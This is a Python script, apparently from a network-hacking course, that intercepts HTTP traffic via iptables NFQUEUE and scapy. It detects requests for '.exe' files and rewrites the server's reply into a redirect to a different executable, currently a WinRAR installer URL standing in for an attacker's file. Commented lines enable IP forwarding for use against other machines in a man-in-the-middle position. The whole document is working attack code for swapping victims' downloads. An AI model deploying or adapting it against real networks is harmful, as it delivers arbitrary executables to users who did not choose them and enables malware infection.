import netfilterqueue
import scapy.all as scapy
import subprocess


class Command():

    def __init__(self):

        # local
        subprocess.call(['iptables', '-I', 'OUTPUT', '-j',
                         'NFQUEUE', '--queue-num', '0'])
        subprocess.call(['iptables', '-I', 'INPUT', '-j',
                         'NFQUEUE', '--queue-num', '0'])

        # remote
        # subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
        # subprocess.call(['iptables', '-I', 'FORWARD', '-j',
        #                  'NFQUEUE', '--queue-num', '0'])

    def close(self):
        subprocess.call(['iptables', '--flush'])


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet[scapy.TCP].dport)
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in str(scapy_packet[scapy.Raw].load):
                print('[+] exe Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)

                print('[+] Replacing file')
                modified_packet = set_load(
                    scapy_packet,
                    'HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-601.exe\n\n'
                )

                packet.set_payload(bytes(modified_packet))

    packet.accept()


if __name__ == '__main__':
    cmd = Command()
    try:
        queue = netfilterqueue.NetfilterQueue()
        print(queue)
        queue.bind(0, process_packet)
        queue.run()

    except KeyboardInterrupt:
        print('\riptables --flush')
        cmd.close()
